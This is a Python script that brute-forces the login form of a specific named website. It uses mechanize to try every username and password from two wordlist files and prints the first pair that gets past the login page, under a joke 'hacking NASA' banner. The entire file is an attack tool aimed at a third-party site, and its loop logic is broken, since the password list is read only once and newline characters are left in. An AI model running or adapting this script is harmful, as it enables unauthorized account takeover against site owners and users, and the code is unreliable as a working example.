import mechanize

b = mechanize.Browser()
url = "http://www.cs2lion.webvis.co.za/login.php"
word_list = 'usernames.txt'
password_list = 'passwords.txt'


def run():
    print("hacking NASA initialized...")
    usernames = None
    passwords = None
    try:
        usernames = open(word_list, "r")
    except:
        print('error opening usernames file')
        quit()

    try:
        passwords = open(password_list, "r")
    except:
        print('error opening passwords file')
        quit()

    for username in usernames:
        username = username.strip()
        print('Test: username: {}'.format(username))
        for password in passwords:
            # print('Test: username: {}, password: {}'.format(username, password))
            r = b.open(url)
            b.select_form(nr=0)
            b.form['username'] = username
            b.form['password'] = password

            b.method = 'POST'
            response = b.submit()
            if r.geturl() == response.geturl():
                # print("Failed")
                pass
            else:
                print('username: {}, password: {}'.format(username, password))
                quit()


if __name__ == "__main__":
    run()
